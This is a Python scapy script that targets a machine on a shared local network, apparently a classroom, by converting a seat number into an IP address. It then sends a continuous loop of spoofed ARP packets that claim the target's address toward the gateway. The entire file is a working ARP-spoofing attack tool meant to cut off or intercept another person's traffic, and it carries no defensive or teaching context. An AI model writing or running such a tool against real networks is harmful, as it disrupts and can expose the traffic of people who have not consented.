import os
from scapy.all import *

seatAlpha = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H']
gatewayIP = '192.168.170.254'


def arpattack(gatewayIP, targetIP):
    pkt = ARP(psrc=targetIP, pdst=gatewayIP, op=1)
    srloop(pkt)


def main():
    stat = 1
    while stat != 0:
        seatID = input('Please enter seat number: ')
        if seatID == 'exit':
            print('[Info] Exit')
            return (2)
        if len(seatID) == 2:
            stat = 0
        else:
            print('[Fatal] ValueError: Please enter a 8 bit String')

    try:
        targetIP = '192.168.170.{0}{1}'.format(
            str(seatAlpha.index(seatID[0:1]) + 1), str(seatID[1:2]))

    except ValueError:
        print('[Fatal] ValueError: Please enter a valid seat number')
        return (1)
    except TypeError:
        print('[Fatal] TypeError: Please enter a String')
        return (1)
    except Exception as e:
        print('[Fatal] {}'.format(e))
        return (1)

    try:
        arpattack(gatewayIP, targetIP)

    except KeyboardInterrupt:
        print('[Info] Break')
        return (1)
    except Exception as f:
        print('[Fatal] {}'.format(f))
        return (1)


if __name__ == '__main__':
    while True:
        if main() == 2:
            print('[Info] Exit')
            break